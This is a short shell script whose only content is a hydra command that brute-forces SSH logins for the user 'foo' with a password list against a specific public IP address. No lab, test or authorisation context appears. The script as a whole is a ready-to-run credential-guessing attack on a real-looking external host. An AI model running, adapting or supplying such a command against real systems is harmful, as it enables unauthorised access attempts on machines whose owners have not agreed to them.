#!/bin/sh
hydra -t 4 -l foo -P C-Scripts/list.txt -vV 167.86.84.215 ssh
